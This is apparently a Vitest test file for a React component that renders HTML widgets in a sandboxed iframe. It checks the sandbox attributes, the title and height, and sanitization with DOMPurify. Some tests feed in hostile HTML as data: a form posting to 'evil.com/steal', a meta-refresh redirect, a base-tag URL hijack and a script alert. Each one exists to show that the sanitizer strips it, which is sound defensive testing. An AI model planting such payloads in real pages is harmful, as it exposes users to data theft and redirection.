import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { HtmlWidgetBlock } from '../HtmlWidgetBlock';

Object.assign(globalThis as Record<string, unknown>, { React });

describe('HtmlWidgetBlock', () => {
  it('renders iframe with sandbox and title', () => {
    const block = {
      id: 'w1',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<h1>Hello</h1>',
      title: 'Test Widget',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('sandbox="allow-scripts"');
    expect(html).toContain('title="Test Widget"');
    expect(html).toContain('referrerPolicy="no-referrer"');
  });

  it('renders title bar when title is provided', () => {
    const block = {
      id: 'w1b',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>Hi</p>',
      title: 'My Chart',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    // Title bar with font-medium class
    expect(html).toContain('font-medium');
    expect(html).toContain('My Chart');
  });

  it('uses default height of 300px', () => {
    const block = {
      id: 'w2',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>Chart</p>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('height:300px');
  });

  it('uses custom height when specified', () => {
    const block = {
      id: 'w3',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>Tall</p>',
      height: 500,
      title: 'Tall Widget',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('height:500px');
  });

  it('does NOT include allow-same-origin in sandbox (security)', () => {
    const block = {
      id: 'w4',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<script>alert(1)</script>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).not.toContain('allow-same-origin');
  });

  it('uses fallback title "Interactive Widget" when no title given', () => {
    const block = {
      id: 'w5',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>No title</p>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('title="Interactive Widget"');
    // No title bar (no font-medium class)
    expect(html).not.toContain('font-medium');
  });

  // --- F156 D-3: DOMPurify sanitization ---

  it('strips <form> with external action (data exfiltration)', () => {
    const block = {
      id: 'w6',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<form action="https://evil.com/steal"><input name="data"/></form><p>safe</p>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).not.toContain('evil.com');
    expect(html).toContain('safe');
  });

  it('strips <meta http-equiv="refresh"> redirect', () => {
    const block = {
      id: 'w7',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<meta http-equiv="refresh" content="0;url=https://evil.com"><p>content</p>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).not.toContain('evil.com');
    expect(html).not.toContain('http-equiv');
    expect(html).toContain('content');
  });

  it('strips <base> tag (URL hijacking)', () => {
    const block = {
      id: 'w8',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<base href="https://evil.com/"><a href="/page">link</a>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).not.toContain('<base');
    expect(html).toContain('link');
  });

  it('preserves <style> in <head> for full HTML documents (WHOLE_DOCUMENT regression)', () => {
    const block = {
      id: 'w-style',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<html><head><style>body{background:#0f0f1a;color:white;}.flow{display:flex;}</style></head><body><div class="flow">Styled</div></body></html>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    // srcDoc content is HTML-encoded in renderToStaticMarkup output
    expect(html).toContain('&lt;style&gt;');
    expect(html).toContain('background');
    expect(html).toContain('display:flex');
    expect(html).toContain('Styled');
  });

  it('preserves safe HTML and scripts (widget functionality)', () => {
    const block = {
      id: 'w9',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<div><p>Chart</p><script>console.log("widget")</script></div>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('Chart');
    // Scripts should be preserved for widget functionality
    expect(html).toContain('script');
  });
});
